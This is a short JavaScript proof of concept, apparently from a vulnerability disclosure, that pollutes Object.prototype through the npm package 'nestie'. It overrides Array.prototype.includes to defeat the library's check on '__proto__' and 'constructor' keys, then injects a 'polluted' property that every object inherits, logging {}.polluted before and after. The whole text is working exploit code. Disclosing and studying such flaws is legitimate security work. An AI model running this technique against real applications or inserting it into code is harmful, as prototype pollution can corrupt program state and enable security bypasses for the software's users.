Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);